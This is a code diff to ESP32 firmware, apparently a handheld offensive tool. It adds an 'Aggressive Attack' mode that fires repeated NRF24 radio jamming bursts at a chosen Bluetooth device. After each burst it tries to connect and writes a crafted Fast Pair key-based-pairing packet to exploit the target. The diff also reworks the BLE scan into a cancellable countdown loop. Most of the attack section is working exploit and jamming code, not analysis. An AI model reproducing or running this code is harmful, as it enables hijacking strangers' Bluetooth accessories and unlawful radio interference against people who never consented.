@@ -336,7 +336,7 @@ String selectTargetFromScan(const char* title) {
     
     tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
     tft.setCursor(20, 60);
-    tft.print("Scanning... 30s");
+    tft.print("Scanning... 20s");
     tft.setCursor(20, 80);
     tft.print("Found: 0");
     
@@ -352,21 +352,66 @@ String selectTargetFromScan(const char* title) {
     pBLEScan->setInterval(100);
     pBLEScan->setWindow(99);
     
-    BLEScanResults foundDevices;
+    uint32_t scanStartTime = millis();
+    uint32_t scanDuration = 20000;
+    bool scanCancelled = false;
+    uint32_t foundCount = 0;
     
-#ifdef NIMBLE_V2_PLUS
-    foundDevices = pBLEScan->getResults(30000, false);
-#else
-    foundDevices = pBLEScan->start(30, false);
-#endif
+    class ScanCallback : public NimBLEScanCallbacks {
+    private:
+        uint32_t* foundCount;
+        
+    public:
+        ScanCallback(uint32_t* count) : foundCount(count) {}
+        
+        void onResult(NimBLEAdvertisedDevice* advertisedDevice) {
+            (*foundCount)++;
+        }
+    };
     
+    ScanCallback scanCallback(&foundCount);
+    pBLEScan->setScanCallbacks(&scanCallback);
+    
+    pBLEScan->start(0, true);
+    
+    while(millis() - scanStartTime < scanDuration && !scanCancelled) {
+        uint32_t remaining = (scanStartTime + scanDuration - millis()) / 1000;
+        
+        tft.fillRect(20, 60, 200, 20, bruceConfig.bgColor);
+        tft.setCursor(20, 60);
+        tft.print("Scanning... " + String(remaining) + "s");
+        
+        tft.fillRect(20, 80, 100, 20, bruceConfig.bgColor);
+        tft.setCursor(20, 80);
+        tft.print("Found: " + String(foundCount));
+        
+        if(check(EscPress)) {
+            scanCancelled = true;
+            pBLEScan->stop();
+            break;
+        }
+        
+        delay(100);
+    }
+    
+    pBLEScan->stop();
+    BLEScanResults foundDevices = pBLEScan->getResults();
     pBLEScan->clearResults();
     
-    int deviceCount = foundDevices.getCount();
+    if(scanCancelled) {
+        showAdaptiveMessage("Scan cancelled", "OK", "", "", TFT_YELLOW);
+        delay(1000);
+        return "";
+    }
     
-    tft.fillRect(20, 80, 200, 20, bruceConfig.bgColor);
+    tft.fillRect(20, 60, 200, 40, bruceConfig.bgColor);
+    tft.setCursor(20, 60);
+    tft.print("Scan complete!");
     tft.setCursor(20, 80);
-    tft.print("Found: " + String(deviceCount));
+    tft.print("Found: " + String(foundDevices.getCount()));
+    delay(1000);
+    
+    int deviceCount = foundDevices.getCount();
     
     if(deviceCount == 0) {
         showAdaptiveMessage("NO DEVICES FOUND", "OK", "", "", TFT_YELLOW);
@@ -477,67 +522,79 @@ void testFastPairVulnerability() {
     delay(2000);
 }
 
-void disconnectAndExploit(NimBLEAddress target) {
-    if(isNRF24Available()) {
-        showAdaptiveMessage("NRF24 Jammer starting...", "", "", "", TFT_YELLOW, false);
-        startJammer();
-        showAdaptiveMessage("NRF24 JAMMING", "Jamming for 3s...", "", "", TFT_YELLOW, false);
-        delay(3000);
-        stopJammer();
-    } else {
-        showAdaptiveMessage("NRF24 module not found", "Continue without jamming", "", "", TFT_YELLOW);
-        delay(2000);
-    }
-
-    showAdaptiveMessage("Attempting connection...", "", "", "", TFT_WHITE, false);
-
-    NimBLEClient* pClient = NimBLEDevice::createClient();
-
-    if(pClient->connect(target, true)) {
-        showAdaptiveMessage("Connected! Running exploit...", "", "", "", TFT_WHITE, false);
-
-        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
-        if(pService) {
-            NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
-            if(pChar) {
-                uint8_t packet[16] = {0};
-                packet[0] = 0x00;
-                packet[1] = 0x11;
-
-                uint8_t targetBytes[6];
-                std::string macStr = target.toString();
-                sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-                       &targetBytes[5], &targetBytes[4], &targetBytes[3],
-                       &targetBytes[2], &targetBytes[1], &targetBytes[0]);
-
-                memcpy(&packet[2], targetBytes, 6);
-                esp_fill_random(&packet[8], 8);
-
-                if(pChar->writeValue(packet, 16, false)) {
-                    delay(100);
-                    bool vulnerable = pChar->canRead() || pChar->canNotify();
-                    pClient->disconnect();
-
-                    if(vulnerable) {
-                        showAdaptiveMessage("DEVICE VULNERABLE!", "OK", "", "", TFT_GREEN);
-                    } else {
-                        showAdaptiveMessage("No response", "Device may be patched", "OK", "", TFT_YELLOW);
-                    }
-                } else {
-                    showAdaptiveMessage("Failed to send packet", "OK", "", "", TFT_RED);
-                }
-            } else {
-                showAdaptiveMessage("KBP char not found", "OK", "", "", TFT_YELLOW);
-            }
-        } else {
-            showAdaptiveMessage("Fast Pair service not found", "OK", "", "", TFT_YELLOW);
+bool runExploitOnConnectedDevice(NimBLEClient* pClient, NimBLEAddress target) {
+    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+    if(!pService) return false;
+    
+    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
+    if(!pChar) return false;
+    
+    uint8_t packet[16] = {0};
+    packet[0] = 0x00;
+    packet[1] = 0x11;
+    
+    uint8_t targetBytes[6];
+    std::string macStr = target.toString();
+    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &targetBytes[5], &targetBytes[4], &targetBytes[3],
+           &targetBytes[2], &targetBytes[1], &targetBytes[0]);
+    
+    memcpy(&packet[2], targetBytes, 6);
+    esp_fill_random(&packet[8], 8);
+    
+    if(pChar->writeValue(packet, 16, false)) {
+        delay(50);
+        bool vulnerable = pChar->canRead() || pChar->canNotify();
+        
+        if(vulnerable) {
+            showAdaptiveMessage("EXPLOIT SUCCESS!", "Vulnerable device", "", "", TFT_GREEN);
+            return true;
         }
+    }
+    return false;
+}
 
+void aggressiveJamAndExploit(NimBLEAddress target) {
+    if(isNRF24Available()) {
+        showAdaptiveMessage("Aggressive Signal Attack", "Multiple disruption bursts", "", "", TFT_YELLOW, false);
+        
+        for(int i = 0; i < 3; i++) {
+            startJammer();
+            delay(500);
+            stopJammer();
+            delay(200);
+            
+            showAdaptiveMessage("Burst " + String(i+1) + "/3", "Attempting connection...", "", "", TFT_YELLOW, false);
+            
+            NimBLEClient* pClient = NimBLEDevice::createClient();
+            pClient->setConnectTimeout(2);
+            
+            if(pClient->connect(target, false)) {
+                showAdaptiveMessage("Connected on burst " + String(i+1), "Running exploit...", "", "", TFT_WHITE, false);
+                
+                if(runExploitOnConnectedDevice(pClient, target)) {
+                    NimBLEDevice::deleteClient(pClient);
+                    return;
+                }
+                pClient->disconnect();
+            }
+            NimBLEDevice::deleteClient(pClient);
+        }
+    }
+    
+    showAdaptiveMessage("Fallback: Direct attempt", "", "", "", TFT_YELLOW, false);
+    
+    NimBLEClient* pClient = NimBLEDevice::createClient();
+    pClient->setConnectTimeout(5);
+    
+    if(pClient->connect(target, false)) {
+        showAdaptiveMessage("Direct connection", "Running exploit...", "", "", TFT_WHITE, false);
+        runExploitOnConnectedDevice(pClient, target);
         pClient->disconnect();
     } else {
-        showAdaptiveMessage("Still connected elsewhere", "Try manual disconnect", "OK", "", TFT_RED);
+        showAdaptiveMessage("Connection failed", "Device may be", "connected elsewhere", "OK", TFT_RED);
     }
-
+    
     NimBLEDevice::deleteClient(pClient);
 }
 
@@ -578,6 +635,8 @@ void jamAndConnectMenu() {
     tft.print("1. Start Jam & Scan");
     tft.setCursor(20, 150);
     tft.print("2. Jam & Exploit");
+    tft.setCursor(20, 180);
+    tft.print("3. Aggressive Attack");
     tft.setCursor(20, 210);
     tft.print("SEL: Select  ESC: Back");
 
@@ -591,13 +650,22 @@ void jamAndConnectMenu() {
             tft.fillRect(20, 230, tftWidth - 40, 30, bruceConfig.bgColor);
             tft.setCursor(20, 230);
             if(selection == 0) tft.print(">> Start Jam & Scan");
-            else tft.print(">> Jam & Exploit");
+            else if(selection == 1) tft.print(">> Jam & Exploit");
+            else tft.print(">> Aggressive Attack");
             redraw = false;
         }
 
-        if(check(PrevPress) || check(NextPress)) {
-            selection = 1 - selection;
-            redraw = true;
+        if(check(PrevPress)) {
+            if(selection > 0) {
+                selection--;
+                redraw = true;
+            }
+        }
+        if(check(NextPress)) {
+            if(selection < 2) {
+                selection++;
+                redraw = true;
+            }
         }
 
         if(check(SelPress)) {
@@ -617,7 +685,7 @@ void jamAndConnectMenu() {
                     NimBLEAddress target(selectedMAC.c_str(), addrType);
                     
                     if(requireSimpleConfirmation("Run exploit on device?")) {
-                        disconnectAndExploit(target);
+                        aggressiveJamAndExploit(target);
                     }
                 }
             }
@@ -645,7 +713,34 @@ void jamAndConnectMenu() {
                 }
                 
                 if(requireSimpleConfirmation("Start jam and exploit?")) {
-                    disconnectAndExploit(target);
+                    aggressiveJamAndExploit(target);
+                }
+            }
+            else if(selection == 2) {
+                initBLEIfNeeded("Bruce-WP-ATTACK");
+                
+                String selectedInfo = selectTargetFromScan("SELECT TARGET");
+                if(selectedInfo.isEmpty()) return;
+                
+                int colonPos = selectedInfo.lastIndexOf(':');
+                if(colonPos == -1) {
+                    showAdaptiveMessage("Invalid device info", "OK", "", "", TFT_RED);
+                    return;
+                }
+                
+                String selectedMAC = selectedInfo.substring(0, colonPos);
+                uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
+                
+                NimBLEAddress target;
+                try {
+                    target = NimBLEAddress(selectedMAC.c_str(), addrType);
+                } catch (...) {
+                    showAdaptiveMessage("Invalid MAC address", "OK", "", "", TFT_RED);
+                    return;
+                }
+                
+                if(requireSimpleConfirmation("Start aggressive attack?")) {
+                    aggressiveJamAndExploit(target);
                 }
             }
             return;
